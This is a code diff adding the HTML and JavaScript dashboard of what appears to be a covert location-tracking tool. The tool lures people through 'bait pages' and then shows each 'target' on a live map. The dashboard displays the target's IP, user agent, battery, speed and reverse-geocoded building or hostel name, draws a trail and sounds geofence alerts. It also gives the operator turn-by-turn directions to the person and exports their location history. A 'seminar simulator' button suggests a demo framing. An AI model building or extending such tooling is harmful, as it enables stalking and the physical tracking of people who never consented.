@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Cyber Map HUD - {{ appName }}</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Rajdhani:wght@500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', sans-serif;
+        }
+
+        body {
+            background: #030712;
+            color: #f1f5f9;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Top HUD Header */
+        .hud-header {
+            background: rgba(9, 14, 26, 0.95);
+            border-bottom: 1px solid rgba(0, 242, 254, 0.3);
+            backdrop-filter: blur(12px);
+            padding: 10px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            z-index: 1000;
+        }
+
+        .hud-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .btn-hud-back {
+            padding: 6px 14px;
+            background: rgba(0, 242, 254, 0.1);
+            border: 1px solid rgba(0, 242, 254, 0.4);
+            color: #38bdf8;
+            border-radius: 6px;
+            text-decoration: none;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.3s;
+        }
+
+        .btn-hud-back:hover {
+            background: #00f2fe;
+            color: #030712;
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.5);
+        }
+
+        .target-selector-dropdown {
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid rgba(0, 242, 254, 0.4);
+            color: #00f2fe;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            padding: 6px 12px;
+            border-radius: 6px;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .hud-center-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            letter-spacing: 2px;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .hud-controls {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-hud-toggle {
+            padding: 6px 12px;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: #94a3b8;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Orbitron', sans-serif;
+            transition: all 0.3s;
+        }
+
+        .btn-hud-toggle.active {
+            background: rgba(34, 197, 94, 0.2);
+            border-color: #22c55e;
+            color: #4ade80;
+            box-shadow: 0 0 12px rgba(34, 197, 94, 0.4);
+        }
+
+        .btn-hud-sim {
+            background: rgba(245, 158, 11, 0.2);
+            border-color: #f59e0b;
+            color: #fbbf24;
+        }
+
+        .btn-hud-sim.running {
+            background: rgba(239, 68, 68, 0.2);
+            border-color: #ef4444;
+            color: #f87171;
+        }
+
+        /* HUD Main Viewport */
+        .viewport-container {
+            flex: 1;
+            position: relative;
+            display: flex;
+        }
+
+        #map {
+            width: 100%;
+            height: 100%;
+            background: #050811;
+            z-index: 1;
+        }
+
+        /* Telemetry Side HUD Panel */
+        .telemetry-panel {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 320px;
+            background: rgba(9, 14, 26, 0.85);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            border-radius: 14px;
+            padding: 20px;
+            z-index: 100;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
+            pointer-events: auto;
+        }
+
+        .telemetry-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            letter-spacing: 1px;
+            color: #00f2fe;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(0, 242, 254, 0.2);
+            padding-bottom: 8px;
+        }
+
+        .coords-display {
+            background: rgba(0, 242, 254, 0.05);
+            border: 1px solid rgba(0, 242, 254, 0.2);
+            border-radius: 8px;
+            padding: 10px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+
+        .coords-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            color: #ffffff;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(0, 242, 254, 0.5);
+        }
+
+        .metric-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+
+        .metric-card {
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .metric-label {
+            font-size: 11px;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 4px;
+        }
+
+        .metric-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 15px;
+            color: #38bdf8;
+            font-weight: 700;
+        }
+
+        .device-info-box {
+            font-size: 12px;
+            color: #94a3b8;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 10px;
+            border-radius: 6px;
+            line-height: 1.5;
+            word-break: break-all;
+        }
+
+        /* Pulse Marker CSS */
+        .cyber-marker {
+            background: #00f2fe;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #00f2fe;
+            animation: pulse-ring 1.8s infinite;
+        }
+
+        @keyframes pulse-ring {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 242, 254, 0.8);
+            }
+
+            70% {
+                box-shadow: 0 0 0 20px rgba(0, 242, 254, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 242, 254, 0);
+            }
+        }
+
+        /* Geofence Alert Overlay */
+        .geofence-banner {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(239, 68, 68, 0.9);
+            border: 2px solid #ffffff;
+            color: #ffffff;
+            font-family: 'Orbitron', sans-serif;
+            padding: 12px 24px;
+            border-radius: 10px;
+            z-index: 1000;
+            box-shadow: 0 0 30px rgba(239, 68, 68, 0.8);
+            display: none;
+            animation: flash-red 0.8s infinite alternate;
+        }
+
+        @keyframes flash-red {
+            from {
+                opacity: 0.7;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="hud-header">
+        <div class="hud-left">
+            <a href="/" class="btn-hud-back">
+                <i class="fa-solid fa-chevron-left"></i> DASHBOARD
+            </a>
+            <select id="targetSelect" class="target-selector-dropdown" onchange="switchTarget(this.value)">
+                <option value="">SELECT TARGET</option>
+            </select>
+        </div>
+
+        <div class="hud-center-title">
+            <i class="fa-solid fa-crosshairs" style="color: #00f2fe;"></i>
+            <span>LIVE TARGET HUD</span>
+        </div>
+
+        <div class="hud-controls">
+            <button id="trackingPauseBtn" class="btn-hud-toggle active" onclick="toggleTrackingPause()">
+                <i class="fa-solid fa-play"></i> TRACKING ACTIVE
+            </button>
+            <button id="adminGpsBtn" class="btn-hud-toggle" onclick="getAdminLocation()">
+                <i class="fa-solid fa-location-crosshairs"></i> MY LOCATION & DISTANCE
+            </button>
+            <button id="soundBtn" class="btn-hud-toggle active" onclick="toggleSound()">
+                <i class="fa-solid fa-volume-high"></i> SOUND ON
+            </button>
+            <button id="simBtn" class="btn-hud-toggle btn-hud-sim" onclick="toggleSeminarSimulation()">
+                <i class="fa-solid fa-play"></i> SEMINAR SIMULATOR
+            </button>
+            <button class="btn-hud-toggle" onclick="exportTargetLogs('csv')">
+                <i class="fa-solid fa-file-csv"></i> CSV
+            </button>
+            <button class="btn-hud-toggle" onclick="deleteCurrentTarget()"
+                style="border-color: rgba(239, 68, 68, 0.4); color: #f87171;">
+                <i class="fa-solid fa-trash"></i> DELETE
+            </button>
+        </div>
+    </div>
+
+    <div class="viewport-container">
+
+        <div class="telemetry-panel">
+            <div class="telemetry-title">
+                <span>TELEMETRY HUD</span>
+                <span id="statusBadge" style="font-size: 11px; color: #4ade80;">SEARCHING...</span>
+            </div>
+
+            <!-- Reverse Geocoding Address Card -->
+            <div
+                style="background: rgba(0, 242, 254, 0.08); border: 1px solid rgba(0, 242, 254, 0.3); border-radius: 8px; padding: 10px; margin-bottom: 12px;">
+                <div
+                    style="font-size: 11px; color: #00f2fe; font-weight: 700; text-transform: uppercase; margin-bottom: 4px; display: flex; align-items: center; justify-content: space-between;">
+                    <span><i class="fa-solid fa-building-user"></i> LANDMARK / BUILDING</span>
+                    <i id="geoSpin" class="fa-solid fa-arrows-rotate fa-spin" style="display: none;"></i>
+                </div>
+                <div id="dispBuilding" style="font-size: 13px; font-weight: 700; color: #ffffff; margin-bottom: 4px;">
+                    Detecting Building / Hostel Name...</div>
+                <div id="dispFullAddress" style="font-size: 11px; color: #94a3b8; line-height: 1.3;">Fetching address
+                    details...</div>
+            </div>
+
+            <!-- Admin to Target Distance Card -->
+            <div id="distanceCard"
+                style="display: none; background: rgba(34, 197, 94, 0.08); border: 1px solid rgba(34, 197, 94, 0.3); border-radius: 8px; padding: 10px; margin-bottom: 12px;">
+                <div
+                    style="font-size: 11px; color: #4ade80; font-weight: 700; text-transform: uppercase; margin-bottom: 4px;">
+                    <i class="fa-solid fa-route"></i> DISTANCE & NAVIGATION
+                </div>
+                <div id="dispDistance" style="font-size: 14px; font-weight: 800; color: #ffffff;">Calculating
+                    distance...</div>
+                <a id="navDirectionsBtn" href="#" target="_blank"
+                    style="display: inline-block; margin-top: 6px; font-size: 11px; color: #38bdf8; font-weight: 700; text-decoration: underline;">
+                    <i class="fa-solid fa-diamond-turn-right"></i> Open Turn-by-Turn Directions
+                </a>
+            </div>
+
+            <div class="coords-display">
+                <div class="metric-label">CURRENT COORDINATES</div>
+                <div id="dispCoords" class="coords-value">0.00000, 0.00000</div>
+            </div>
+
+            <div class="metric-grid">
+                <div class="metric-card">
+                    <div class="metric-label">SPEED</div>
+                    <div id="dispSpeed" class="metric-value">0 km/h</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-label">ACCURACY</div>
+                    <div id="dispAccuracy" class="metric-value">±0m</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-label">ALTITUDE</div>
+                    <div id="dispAltitude" class="metric-value">0m</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-label">BATTERY</div>
+                    <div id="dispBattery" class="metric-value">N/A</div>
+                </div>
+            </div>
+
+            <div class="device-info-box">
+                <div><strong>TARGET ID:</strong> <span id="dispTargetId" style="color: #00f2fe;">None</span></div>
+                <div><strong>IP:</strong> <span id="dispIp">--</span></div>
+                <div><strong>BAIT PAGE:</strong> <span id="dispBait">--</span></div>
+                <div style="margin-top: 4px;"><strong>USER AGENT:</strong> <span id="dispUa"
+                        style="font-size: 10px;">--</span></div>
+            </div>
+        </div>
+
+
+        <div id="geofenceAlert" class="geofence-banner">
+            <i class="fa-solid fa-triangle-exclamation"></i> GEOFENCE BOUNDARY BREACHED!
+        </div>
+
+        <div id="map"></div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        const initialSelectedId = "{{ selectedId }}";
+        let allTargets = {};
+        let activeTargetId = initialSelectedId;
+        let soundEnabled = true;
+        let isTrackingPaused = false;
+        let simInterval = null;
+
+        let adminLocation = null;
+        let adminMarker = null;
+        let distanceLine = null;
+        let lastGeocodedCoords = "";
+
+        // Leaflet setup
+        const defaultLat = 17.3850;
+        const defaultLng = 78.4867; // Default Hyderabad coordinates
+        const map = L.map('map', { zoomControl: false }).setView([defaultLat, defaultLng], 13);
+
+        L.control.zoom({ position: 'bottomright' }).addTo(map);
+
+        // Standard OpenStreetMap & Esri Dark tiles (Zero API key required)
+        const osmTiles = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19,
+            attribution: '© OpenStreetMap contributors'
+        });
+
+        const esriDarkTiles = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
+            maxZoom: 16,
+            attribution: 'Tiles © Esri'
+        });
+
+        const cartoDarkTiles = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            maxZoom: 19,
+            subdomains: 'abcd',
+            attribution: '© OpenStreetMap © CARTO'
+        });
+
+        // Add Esri Dark Canvas as default layer (100% Free, No API Key Required)
+        esriDarkTiles.addTo(map);
+
+        // Layer Control for map toggle
+        const baseMaps = {
+            "Esri Cyber Dark": esriDarkTiles,
+            "OpenStreetMap Standard": osmTiles,
+            "Carto Dark": cartoDarkTiles
+        };
+        L.control.layers(baseMaps, null, { position: 'topright' }).addTo(map);
+
+        // Marker & Accuracy circle
+        let targetMarker = null;
+        let accuracyCircle = null;
+        let polylineTrail = null;
+        let trailCoords = [];
+
+        const cyberIcon = L.divIcon({
+            className: 'cyber-marker',
+            iconSize: [22, 22],
+            iconAnchor: [11, 11]
+        });
+
+        const adminIcon = L.divIcon({
+            className: 'admin-marker',
+            html: '<div style="background: #22c55e; border: 2px solid #fff; border-radius: 50%; width: 18px; height: 18px; box-shadow: 0 0 15px #22c55e;"></div>',
+            iconSize: [18, 18],
+            iconAnchor: [9, 9]
+        });
+
+        function toggleTrackingPause() {
+            isTrackingPaused = !isTrackingPaused;
+            const btn = document.getElementById("trackingPauseBtn");
+            if (isTrackingPaused) {
+                btn.className = "btn-hud-toggle";
+                btn.innerHTML = '<i class="fa-solid fa-pause"></i> TRACKING PAUSED';
+            } else {
+                btn.className = "btn-hud-toggle active";
+                btn.innerHTML = '<i class="fa-solid fa-play"></i> TRACKING ACTIVE';
+            }
+        }
+
+        function getAdminLocation() {
+            if (!navigator.geolocation) {
+                alert("Geolocation is not supported by your browser.");
+                return;
+            }
+
+            document.getElementById("adminGpsBtn").innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> LOCATING...';
+
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    adminLocation = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude
+                    };
+
+                    document.getElementById("adminGpsBtn").className = "btn-hud-toggle active";
+                    document.getElementById("adminGpsBtn").innerHTML = '<i class="fa-solid fa-location-crosshairs"></i> MY LOCATION ACTIVE';
+
+                    if (!adminMarker) {
+                        adminMarker = L.marker([adminLocation.lat, adminLocation.lng], { icon: adminIcon }).addTo(map)
+                            .bindPopup("<b>Admin Command Position</b>").openPopup();
+                    } else {
+                        adminMarker.setLatLng([adminLocation.lat, adminLocation.lng]);
+                    }
+
+                    if (activeTargetId && allTargets[activeTargetId]) {
+                        calculateDistanceAndRoute(allTargets[activeTargetId]);
+                    }
+                },
+                (err) => {
+                    alert("Unable to fetch Admin location. Please allow browser location permissions.");
+                    document.getElementById("adminGpsBtn").innerHTML = '<i class="fa-solid fa-location-crosshairs"></i> MY LOCATION & DISTANCE';
+                },
+                { enableHighAccuracy: true }
+            );
+        }
+
+        function calculateDistanceAndRoute(target) {
+            if (!adminLocation) return;
+
+            const lat1 = adminLocation.lat;
+            const lon1 = adminLocation.lng;
+            const lat2 = target.lat;
+            const lon2 = target.lng;
+
+            // Haversine formula
+            const R = 6371; // Earth radius in km
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                Math.sin(dLon / 2) * Math.sin(dLon / 2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+            const dKm = R * c;
+            const dMeters = Math.round(dKm * 1000);
+
+            const distStr = dKm < 1 ? `${dMeters} meters away` : `${dKm.toFixed(2)} km (${dMeters.toLocaleString()} m) away`;
+            document.getElementById("dispDistance").innerText = distStr;
+            document.getElementById("distanceCard").style.display = "block";
+
+            const gmapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${lat1},${lon1}&destination=${lat2},${lon2}`;
+            document.getElementById("navDirectionsBtn").href = gmapsUrl;
+
+            // Draw line between Admin and Target
+            if (!distanceLine) {
+                distanceLine = L.polyline([[lat1, lon1], [lat2, lon2]], {
+                    color: '#22c55e',
+                    weight: 3,
+                    opacity: 0.8,
+                    dashArray: '8, 8'
+                }).addTo(map);
+            } else {
+                distanceLine.setLatLngs([[lat1, lon1], [lat2, lon2]]);
+            }
+        }
+
+        function fetchAddress(lat, lng) {
+            const coordsKey = `${lat.toFixed(4)},${lng.toFixed(4)}`;
+            if (lastGeocodedCoords === coordsKey) return;
+            lastGeocodedCoords = coordsKey;
+
+            document.getElementById("geoSpin").style.display = "inline-block";
+
+            fetch(`/api/reverse-geocode?lat=${lat}&lng=${lng}`)
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById("geoSpin").style.display = "none";
+                    document.getElementById("dispBuilding").innerText = data.building || "Location Detected";
+                    document.getElementById("dispFullAddress").innerText = data.fullAddress || `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+                })
+                .catch(() => {
+                    document.getElementById("geoSpin").style.display = "none";
+                });
+        }
+
+        function deleteCurrentTarget() {
+            if (!activeTargetId) return;
+            if (confirm(`Delete tracking logs for target ${activeTargetId}?`)) {
+                fetch("/api/target/delete", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ id: activeTargetId })
+                })
+                    .then(res => res.json())
+                    .then(() => {
+                        window.location.href = "/";
+                    })
+                    .catch(() => {
+                        fetch(`/api/target/${encodeURIComponent(activeTargetId)}`, { method: "DELETE" })
+                            .then(() => { window.location.href = "/"; });
+                    });
+            }
+        }
+
+
+
+        // Web Audio API Radar Ping
+        let audioCtx = null;
+        function playRadarPing() {
+            if (!soundEnabled) return;
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = "sine";
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime); // A5 note
+                osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.15);
+                gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.3);
+            } catch (e) { }
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            const btn = document.getElementById("soundBtn");
+            if (soundEnabled) {
+                btn.className = "btn-hud-toggle active";
+                btn.innerHTML = '<i class="fa-solid fa-volume-high"></i> SOUND ON';
+            } else {
+                btn.className = "btn-hud-toggle";
+                btn.innerHTML = '<i class="fa-solid fa-volume-xmark"></i> SOUND OFF';
+            }
+        }
+
+        // WebSockets Client
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        });
+
+        socket.emit("join-admin");
+
+        socket.on("initial-targets", (targetsMap) => {
+            allTargets = targetsMap;
+            updateTargetDropdown();
+            if (activeTargetId && allTargets[activeTargetId]) {
+                focusTarget(allTargets[activeTargetId]);
+            } else if (Object.keys(allTargets).length > 0) {
+                switchTarget(Object.keys(allTargets)[0]);
+            }
+        });
+
+        socket.on("user-connected", (target) => {
+            allTargets[target.id] = target;
+            updateTargetDropdown();
+            if (!activeTargetId) switchTarget(target.id);
+        });
+
+        socket.on("map-data", (data) => {
+            if (data && data.target) {
+                allTargets[data.id] = data.target;
+                if (data.id === activeTargetId && !isTrackingPaused) {
+                    focusTarget(data.target);
+                    playRadarPing();
+                }
+            }
+        });
+
+        function updateTargetDropdown() {
+            const select = document.getElementById("targetSelect");
+            select.innerHTML = '<option value="">SELECT TARGET</option>';
+            for (const id in allTargets) {
+                const opt = document.createElement("option");
+                opt.value = id;
+                opt.innerText = `${id} (${allTargets[id].baitType || 'Bait'})`;
+                if (id === activeTargetId) opt.selected = true;
+                select.appendChild(opt);
+            }
+        }
+
+        function switchTarget(id) {
+            activeTargetId = id;
+            trailCoords = [];
+            if (polylineTrail) map.removeLayer(polylineTrail);
+            polylineTrail = null;
+            if (allTargets[id]) focusTarget(allTargets[id]);
+        }
+
+        function focusTarget(target) {
+            const lat = target.lat;
+            const lng = target.lng;
+            const latLng = [lat, lng];
+
+            document.getElementById("dispTargetId").innerText = target.id;
+            document.getElementById("dispCoords").innerText = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+            document.getElementById("dispSpeed").innerText = `${Math.round(target.speed || 0)} km/h`;
+            document.getElementById("dispAccuracy").innerText = `±${Math.round(target.accuracy || 0)}m`;
+            document.getElementById("dispAltitude").innerText = `${Math.round(target.altitude || 0)}m`;
+            document.getElementById("dispBattery").innerText = target.battery || "N/A";
+            document.getElementById("dispIp").innerText = target.ip || "127.0.0.1";
+            document.getElementById("dispBait").innerText = target.baitType || "Generic";
+            document.getElementById("dispUa").innerText = target.userAgent || "--";
+            document.getElementById("statusBadge").innerText = "LIVE ONLINE";
+
+            fetchAddress(lat, lng);
+            calculateDistanceAndRoute(target);
+
+            if (!targetMarker) {
+                targetMarker = L.marker(latLng, { icon: cyberIcon }).addTo(map);
+            } else {
+                targetMarker.setLatLng(latLng);
+            }
+
+            if (!accuracyCircle) {
+                accuracyCircle = L.circle(latLng, {
+                    radius: target.accuracy || 20,
+                    color: '#00f2fe',
+                    fillColor: '#00f2fe',
+                    fillOpacity: 0.15,
+                    weight: 1
+                }).addTo(map);
+            } else {
+                accuracyCircle.setLatLng(latLng);
+                accuracyCircle.setRadius(target.accuracy || 20);
+            }
+
+            // Update Polyline trail
+            trailCoords.push(latLng);
+            if (!polylineTrail) {
+                polylineTrail = L.polyline(trailCoords, {
+                    color: '#00f2fe',
+                    weight: 3,
+                    opacity: 0.8,
+                    dashArray: '5, 10'
+                }).addTo(map);
+            } else {
+                polylineTrail.setLatLngs(trailCoords);
+            }
+
+            map.panTo(latLng);
+        }
+
+
+        // Seminar Presentation Simulator Generator
+        function toggleSeminarSimulation() {
+            const btn = document.getElementById("simBtn");
+            if (simInterval) {
+                clearInterval(simInterval);
+                simInterval = null;
+                btn.className = "btn-hud-toggle btn-hud-sim";
+                btn.innerHTML = '<i class="fa-solid fa-play"></i> SEMINAR SIMULATOR';
+                return;
+            }
+
+            btn.className = "btn-hud-toggle btn-hud-sim running";
+            btn.innerHTML = '<i class="fa-solid fa-stop"></i> STOP SIMULATOR';
+
+            let simLat = defaultLat;
+            let simLng = defaultLng;
+            let simAngle = 0;
+            const simTargetId = activeTargetId || "SeminarDemoTarget";
+
+            simInterval = setInterval(() => {
+                simAngle += 0.15;
+                simLat += Math.sin(simAngle) * 0.0005;
+                simLng += Math.cos(simAngle) * 0.0005;
+
+                const payload = {
+                    id: simTargetId,
+                    lat: simLat,
+                    lng: simLng,
+                    speed: Math.floor(15 + Math.random() * 20),
+                    accuracy: 12,
+                    altitude: 540,
+                    battery: "88%",
+                    baitType: "Seminar Live Demo"
+                };
+
+                fetch("/location-payload", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            }, 2500);
+        }
+
+        function exportTargetLogs(format) {
+            if (!activeTargetId || !allTargets[activeTargetId]) {
+                alert("Please select an active target to export logs.");
+                return;
+            }
+            const target = allTargets[activeTargetId];
+            fetch(`/api/target/${encodeURIComponent(target.id)}/history`)
+                .then(res => res.json())
+                .then(data => {
+                    if (format === 'json') {
+                        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                        const link = document.createElement('a');
+                        link.href = URL.createObjectURL(blob);
+                        link.download = `${target.id}_location_history.json`;
+                        link.click();
+                    } else {
+                        let csv = "Timestamp,Latitude,Longitude,Accuracy,Speed\n";
+                        (data.history || []).forEach(h => {
+                            csv += `"${h.timestamp}",${h.lat},${h.lng},${h.accuracy},${h.speed}\n`;
+                        });
+                        const blob = new Blob([csv], { type: 'text/csv' });
+                        const link = document.createElement('a');
+                        link.href = URL.createObjectURL(blob);
+                        link.download = `${target.id}_location_history.csv`;
+                        link.click();
+                    }
+                });
+        }
+    </script>
+</body>
+
+</html>
